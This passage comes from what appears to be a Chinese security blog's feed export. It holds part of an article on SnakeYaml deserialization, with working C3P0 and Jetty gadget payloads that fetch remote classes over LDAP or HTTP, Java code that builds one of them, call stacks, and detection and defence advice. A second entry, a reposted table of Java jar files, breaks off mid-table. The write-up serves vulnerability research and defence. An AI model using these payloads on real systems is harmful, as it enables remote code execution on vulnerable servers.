class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:55, ConfigurationMap (org.apache.commons.configuration)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">processDuplicateKeys:85, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">flattenMapping:70, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:183, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:465, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:12, Test</span><br></pre></td></tr></table></figure><h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><p>原理和环境相关的参考<a href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E4%B8%83%E2%80%94%E2%80%94%E5%85%B6%E4%BB%96Gadgets/#0x03-%E5%9F%BA%E4%BA%8EC3P0-JndiRefForwardingDataSource%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE">Jackson系列文章</a>即可。</p><p>关键PoC，5.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!!com.mchange.v2.c3p0.JndiRefForwardingDataSource</span><br><span class="line">  jndiName: &quot;ldap://localhost:1389/Exploit&quot;</span><br><span class="line">  loginTimeout: 0</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/24.png" alt=""></p><h3 id="C3P0-WrapperConnectionPoolDataSource"><a href="#C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="C3P0 WrapperConnectionPoolDataSource"></a>C3P0 WrapperConnectionPoolDataSource</h3><p>本地环境的jar包：c3p0-0.9.5.2，mchange-commons-java-0.2.15，commons-codec-1.12，snakeyaml-1.25。</p><p>关键PoC，注意冒号后面有个空格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span><br><span class="line">  userOverridesAsString: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;&quot;</span><br></pre></td></tr></table></figure><p>我们主要看下userOverridesAsString的值是如何构造的，参考marshalsec的Gadget就知道了，下面是输出该值的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createPoC</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String poc = makeC3P0UserOverridesString(<span class="string">"http://localhost:8000/"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">makeC3P0UserOverridesString</span> <span class="params">( String codebase, String clazz )</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="function">InstantiationException, IllegalAccessException, InvocationTargetException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream b = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">try</span> ( ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(b) ) &#123;</span><br><span class="line">        Class&lt;?&gt; refclz = Class.forName(<span class="string">"com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        Constructor&lt;?&gt; con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);</span><br><span class="line">        con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Reference jndiref = <span class="keyword">new</span> Reference(<span class="string">"Foo"</span>, clazz, codebase);</span><br><span class="line">        Object ref = con.newInstance(jndiref, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        oos.writeObject(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"HexAsciiSerializedMap:"</span> + Hex.encodeHexString(b.toByteArray()) + <span class="string">";"</span>; <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/25.png" alt=""></p><p>该Gadget原理是userOverridesAsString的setter方法触发C3P0数据库连接池去调用referenceToObject()函数将Reference转化成对象的时候导致的。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:2, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">referenceToObject:92, ReferenceableUtils (com.mchange.v2.naming)</span><br><span class="line">getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming)</span><br><span class="line">fromByteArray:125, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)</span><br><span class="line">vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)</span><br><span class="line">fireVetoableChange:375, VetoableChangeSupport (java.beans)</span><br><span class="line">fireVetoableChange:271, VetoableChangeSupport (java.beans)</span><br><span class="line">setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:77, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:17, Test</span><br></pre></td></tr></table></figure><h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3><p>本地环境的jar包：snakeyaml-1.25，jetty-jndi-9.4.8.v20171121，jetty-plus-9.4.8.v20171121，jetty-util-9.4.8.v20171121。</p><p>关键PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!!org.eclipse.jetty.plus.jndi.Resource [&quot;__/obj&quot;, !!javax.naming.Reference [&quot;foo&quot;, &quot;Exploit&quot;, &quot;http://localhost:8000/&quot;]], !!org.eclipse.jetty.plus.jndi.Resource [&quot;obj/test&quot;, !!java.lang.Object []]]</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/26.png" alt=""></p><p>Resource类的原理是JNDI注入漏洞，但是是基于NamingManager.getObjectInstance()函数的注入。</p><p>函数调用栈入如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:2, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:319, NamingManager (javax.naming.spi)</span><br><span class="line">lookup:503, NamingContext (org.eclipse.jetty.jndi)</span><br><span class="line">lookup:578, NamingContext (org.eclipse.jetty.jndi)</span><br><span class="line">bind:69, NamingUtil (org.eclipse.jetty.jndi)</span><br><span class="line">save:202, NamingEntry (org.eclipse.jetty.plus.jndi)</span><br><span class="line">&lt;init&gt;:39, Resource (org.eclipse.jetty.plus.jndi)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructSequenceStep2:376, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructSequence:360, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:499, SafeConstructor$ConstructYamlSeq (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:10, Test</span><br></pre></td></tr></table></figure><h2 id="0x04-检测与防御"><a href="#0x04-检测与防御" class="headerlink" title="0x04 检测与防御"></a>0x04 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>排查服务端环境是否使用了SnakeYaml，若使用了则全局搜索关键字<code>yaml.load(</code>，若存在该关键字则需要进一步排查参数是否外部可控。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>禁止Yaml.load()函数参数外部可控；</li><li>若业务确实需要反序列化，则需严格过滤该参数内容，使用SafeConstructor对反序列化的内容进行限制或使用白名单控制反序列化的类的白名单；</li></ul><p>在snakeyaml-1.25-sources.jar!/org/yaml/snakeyaml/constructor/SafeConstructor.java中看到，其构造函数就自定义了反序列化的类的白名单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SafeConstructor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.NULL, <span class="keyword">new</span> ConstructYamlNull());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.BOOL, <span class="keyword">new</span> ConstructYamlBool());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.INT, <span class="keyword">new</span> ConstructYamlInt());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.FLOAT, <span class="keyword">new</span> ConstructYamlFloat());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.BINARY, <span class="keyword">new</span> ConstructYamlBinary());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.TIMESTAMP, <span class="keyword">new</span> ConstructYamlTimestamp());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.OMAP, <span class="keyword">new</span> ConstructYamlOmap());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.PAIRS, <span class="keyword">new</span> ConstructYamlPairs());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.SET, <span class="keyword">new</span> ConstructYamlSet());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.STR, <span class="keyword">new</span> ConstructYamlStr());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.SEQ, <span class="keyword">new</span> ConstructYamlSeq());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(Tag.MAP, <span class="keyword">new</span> ConstructYamlMap());</span><br><span class="line">    <span class="keyword">this</span>.yamlConstructors.put(<span class="keyword">null</span>, undefinedConstructor);</span><br><span class="line">    <span class="keyword">this</span>.yamlClassConstructors.put(NodeId.scalar, undefinedConstructor);</span><br><span class="line">    <span class="keyword">this</span>.yamlClassConstructors.put(NodeId.sequence, undefinedConstructor);</span><br><span class="line">    <span class="keyword">this</span>.yamlClassConstructors.put(NodeId.mapping, undefinedConstructor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2042#toc-21" target="_blank" rel="noopener">Java反序列化备忘录</a></p><p><a href="http://vulsee.com/archives/vulsee_2019/1025_9168.html" target="_blank" rel="noopener">yaml.load()反序列化漏洞测试</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>（转）Java项目中常见jar包的说明</title>
    <link href="https://www.mi1k7ea.com/2019/11/25/%EF%BC%88%E8%BD%AC%EF%BC%89Java%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%B8%B8%E8%A7%81jar%E5%8C%85%E7%9A%84%E8%AF%B4%E6%98%8E/"/>
    <id>https://www.mi1k7ea.com/2019/11/25/（转）Java项目中常见jar包的说明/</id>
    <published>2019-11-25T15:33:03.000Z</published>
    <updated>2019-11-27T14:23:29.253Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="https://blog.csdn.net/superdog007/article/details/50697831" target="_blank" rel="noopener">https://blog.csdn.net/superdog007/article/details/50697831</a></p><table><thead><tr><th style="text-align:left">Jar包</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">axis.jar</td><td style="text-align:left">SOAP引擎包</td></tr><tr><td style="text-align:left">commons-discovery-0.2.jar</td><td style="text-align:left">用来发现、查找和实现可插入式接口，提供一些一般类实例化、单件的生命周期管理的常用方法.</td></tr><tr><td style="text-align:left">jaxrpc.jar</td><td style="text-align:left">Axis运行所需要的组件包</td></tr><tr><td style="text-align:left">saaj.jar</td><td style="text-align:left">创建到端点的点到点连接的方法、创建并处理SOAP消息和附件的方法，以及接收和处理SOAP错误的方法.</td></tr><tr><td style="text-align:left">wsdl4j-1.5.1.jar</td><td style="text-align:left">Axis运行所需要的组件包</td></tr><tr><td style="text-align:left">activation.jar</td><td style="text-align:left">JAF框架的jar包</td></tr><tr><td style="text-align:left">annotations-api.jar</td><td style="text-align:left">使用注解所需jar</td></tr><tr><td style="text-align:left">ant.jar</td><td style="text-align:left">用于自动化调用程序完成项目的编译，打包，测试等</td></tr><tr><td style="text-align:left">aopalliance-1.0.jar</td><td style="text-align:left">支持Spring</td></tr><tr><td style="text-align:left">asm-2.2.3.jar</td><td style="text-align:left">ASM字节码库</td></tr><tr><td style="text-align:left">asm-commons-2.2.3.jar</td><td style="text-align:left">ASM字节码库</td></tr><tr><td style="text-align:left">asm-util-2.2.3.jar</td><td style="text-align:left">Java字节码操纵和分析框架</td></tr><tr><td style="text-align:left">aspectjrt.jar</td><td style="text-align:left">处理事务和AOP所需的包</td></tr><tr><td style="text-align:left">aspectjweaver.jar</td><td style="text-align:left">处理事务和AOP所需的包</td></tr><tr><td style="text-align:left">axiom-api-1.2.7.jar</td><td style="text-align:left">Axis</td></tr><tr><td style="text-align:left">axiom-impl-1.2.7.jar</td><td style="text-align:left">Axis</td></tr><tr><td style="text-align:left">bcprov-jdk15-140.jar</td><td style="text-align:left">基于java1.5</td></tr><tr><td style="text-align:left">bfmclientmodel.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">bpcclientcore.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">bpe137650.jar</td><td style="text-align:left">提供远程访问BPE容器的实现。</td></tr><tr><td style="text-align:left">bsh-2.0b4.jar</td><td style="text-align:left">解决负载逻辑运算</td></tr><tr><td style="text-align:left">c3p0-0.9.0.jar</td><td style="text-align:left">开放源代码的JDBC连接池</td></tr><tr><td style="text-align:left">cglib-nodep-2.1_3.jar</td><td style="text-align:left">Spring中自动代理所需jar包</td></tr><tr><td style="text-align:left">cobertura.jar</td><td style="text-align:left">测量测试覆盖率</td></tr><tr><td style="text-align:left">commons-beanutils-1.7.0.jar</td><td style="text-align:left">动态的获取/设值Java</td></tr><tr><td style="text-align:left">commons-chain-1.1.jar</td><td style="text-align:left">实现责任链设计模式的Java</td></tr><tr><td style="text-align:left">commons-codec-1.3.jar</td><td style="text-align:left">用来处理常用的编码方法的工具类包，例如DES、SHA1、MD5、Base64等等</td></tr><tr><td style="text-align:left">commons-collections-3.1.jar</td><td style="text-align:left">对标准java</td></tr><tr><td style="text-align:left">commons-collections.jar</td><td style="text-align:left">对标准java</td></tr><tr><td style="text-align:left">commons-digester-1.8.jar</td><td style="text-align:left">用于处理struts-config.xml配置文件</td></tr><tr><td style="text-align:left">commons-fileupload-1.1.1.jar</td><td style="text-align:left">struts上传文件</td></tr><tr><td style="text-align:left">commons-httpclient-3.1.jar</td><td style="text-align:left">用来简化HTTP客户端与服务器端进行各种通信编程实现</td></tr><tr><td style="text-align:left">commons-io-1.1.jar</td><td style="text-align:left">针对java.io.InputStream和Reader进行了扩展</td></tr><tr><td style="text-align:left">commons-lang-2.4.jar</td><td style="text-align:left">对java.lang.*的扩展</td></tr><tr><td style="text-align:left">commons-logging-1.1.1.jar</td><td style="text-align:left">日志包</td></tr><tr><td style="text-align:left">commons-pool-1.3.jar</td><td style="text-align:left">实现对象池化框架</td></tr><tr><td style="text-align:left">commons-validator-1.3.1.jar</td><td style="text-align:left">用来把验证规则程序提取出来，以供重复使用</td></tr><tr><td style="text-align:left">db2jcc.jar</td><td style="text-align:left">java连接DB2所需jar</td></tr><tr><td style="text-align:left">db2jcc_license_cu.jar</td><td style="text-align:left">java连接DB2所需jar</td></tr><tr><td style="text-align:left">dom4j-1.6.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">ehcache-1.2.4.jar</td><td style="text-align:left">hibernate的二级缓存如果用ehcache的时候需要此jar包</td></tr><tr><td style="text-align:left">emf.jar</td><td style="text-align:left">基于Eclipse的模型框架</td></tr><tr><td style="text-align:left">ezmorph-1.0.6.jar</td><td style="text-align:left">使用JSON所需的jar包</td></tr><tr><td style="text-align:left">FastInfoset-1.2.2.jar</td><td style="text-align:left">使用WebService所需的jar包</td></tr><tr><td style="text-align:left">freemarker-2.3.8.jar</td><td style="text-align:left">Strus2支持的一种表现层框架</td></tr><tr><td style="text-align:left">geronimo-activation_1.1_spec-1.0.2.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-annotation_1.0_spec-1.1.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-javamail_1.4_spec-1.3.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-jaxws_2.1_spec-1.0.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-jms_1.1_spec-1.1.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-servlet_2.5_spec-1.2.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-stax-api_1.0_spec-1.0.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">hibernate3.jar</td><td style="text-align:left">Hibernate3的核心jar包</td></tr><tr><td style="text-align:left">htmclientmodel.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">jakarta-oro.jar</td><td style="text-align:left">一套文本处理工具，提供per15.0兼容的表达式，AWK-like表达式，Glob表达式。</td></tr><tr><td style="text-align:left">javassist.jar</td><td style="text-align:left">Javassist</td></tr><tr><td style="text-align:left">jaxb-api-2.1.jar</td><td style="text-align:left">使用WebService所需的jar包</td></tr><tr><td style="text-align:left">jaxb-impl-2.1.7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jaxb-xjc-2.1.7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jaxen-1.1.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jcifs-1.2.22.jar</td><td style="text-align:left">实现单点登陆</td></tr><tr><td style="text-align:left">jdom2-1.0.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jdom-1.0.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jettison-1.0.1.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jetty-6.1.9.jar</td><td style="text-align:left">Jetty</td></tr><tr><td style="text-align:left">jetty-util-6.1.9.jar</td><td style="text-align:left">Jetty</td></tr><tr><td style="text-align:left">jra-1.0-alpha-4.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">js-1.6R7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">json-lib-2.2.3-jdk13.jar</td><td style="text-align:left">使用JSON所需的jar包</td></tr><tr><td style="text-align:left">jsonplugin-0.25.jar</td><td style="text-align:left">strus2的JSON插件</td></tr><tr><td style="text-align:left">jsr311-api-0.8.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jstl.jar</td><td style="text-align:left">JSTL标签库</td></tr><tr><td style="text-align:left">jta.jar</td><td style="text-align:left">标准的</td></tr><tr><td style="text-align:left">junit.jar</td><td style="text-align:left">用于单元测试</td></tr><tr><td style="text-align:left">jxl.jar</td><td style="text-align:left">通过java操作excel表格的工具类库</td></tr><tr><td style="text-align:left">ldap.jar</td><td style="text-align:left">JNDI目录服务和LDAO服务器所需的jar</td></tr><tr><td style="text-align:left">ldapbp.jar</td><td style="text-align:left">JNDI目录服务和LDAO服务器所需的jar</td></tr><tr><td style="text-align:left">log4j-1.2.15.jar</td><td style="text-align:left">提供日志功能</td></tr><tr><td style="text-align:left">mail.jar</td><td style="text-align:left">java发送邮件jar包</td></tr><tr><td style="text-align:left">neethi-2.0.4.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">odmg-3.0.jar</td><td style="text-align:left">ODMG是一个ORM的规范，Hibernate实现了ODMG规范，这是一个核心的库</td></tr><tr><td style="text-align:left">gnl-2.6.11.jar</td><td style="text-align:left">struts2中OGNL语言</td></tr><tr><td style="text-align:left">ojdbc14.jar</td><td style="text-align:left">Oracle数据库驱动包</td></tr><tr><td style="text-align:left">opensaml-1.1.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">oro-2.0.8.jar</td><td style="text-align:left">Validator框架所需的jar包</td></tr><tr><td style="text-align:left">oscache-2.1.jar</td><td style="text-align:left">Java</td></tr><tr><td style="text-align:left">poi-3.1-FINAL-20080629.jar</td><td style="text-align:left">操作exce所需jar包</td></tr><tr><td style="text-align:left">poi-contrib-3.1-FINAL-20080629.jar</td><td style="text-align:left">操作exce所需jar包</td></tr><tr><td 